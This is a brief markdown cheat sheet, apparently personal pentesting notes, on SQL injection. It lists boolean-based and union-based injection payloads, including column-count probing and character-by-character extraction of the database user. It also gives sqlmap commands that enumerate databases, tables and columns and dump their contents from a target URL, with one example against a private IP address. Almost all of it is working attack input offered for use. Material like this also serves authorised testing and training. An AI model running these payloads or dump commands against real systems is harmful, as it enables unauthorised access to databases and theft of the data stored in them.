 # SQL Injection
 `'` is your friend
 
### Boolean-based SQL injection
 `' or 1=1`
 
 <br>
 
 
To find current user
```sql
' or substring(user(), 1, 1) = 'a
' or substring(user(), 1, 1) = 'b
.....
```
### Union-based SQL injection

Sample query (complete):
```sql
SELECT name FROM team WHERE id= ' ' UNION SELECT user(); -- -';
```

First, test how many columns are there in the table
```
' UNION SELECT NULL; -- -
' UNION SELECT NULL, NULL; -- -
.....
```
Then we inject something like `' UNION SELECT user(); -- -`

## SQLMap

[cheatsheet](https://dl.packetstormsecurity.net/papers/cheatsheets/sqlmap-cheatsheet-1.0-SDB.pdf)

### Basics
GET
```
$ sqlmap -u <URL> -p <injection param> [options]
# sqlmap -u http://victim.site/login.php?id=3 -p id --technique=U
```

POST
```
$ sqlmap -u <URL> --data=<POST string> -p <injection param> [options]
# sqlmap -u http://victim.site/login.php --data='user=a&pass=a' -p user
```

get database names
```
$ sqlmap -u <URL> --dbs
```

get table names of a specific DB
```
$ sqlmap -u <URL> -D <DB name> --tables
```

get column names of a specific table
```
$ sqlmap -u <URL> -D <DB name> -T <tbl name> --columns
```

get data of specific columns
```
$ sqlmap -u <URL> -D <DB name> -T <tbl name> -C col1,col2 --dump 
```

get all data in a database (incl. all tables)
```
sqlmap -u <URL> --current-db <db-name> --dump
```

### See Payload 
* use verbose level 3 to see what payload is used
* `--flush-session` to force a new session instead of using saved results

Example:
```
sqlmap http://10.124.211.96/newsdetails.php?id=26 -p id -v3 -D awd -T accounts --columns --flush-session
```
![Screenshot_2021-05-16_00-21-57](https://user-images.githubusercontent.com/39619599/118385447-d2dc0800-b5dc-11eb-8d61-9157884379b4.png)

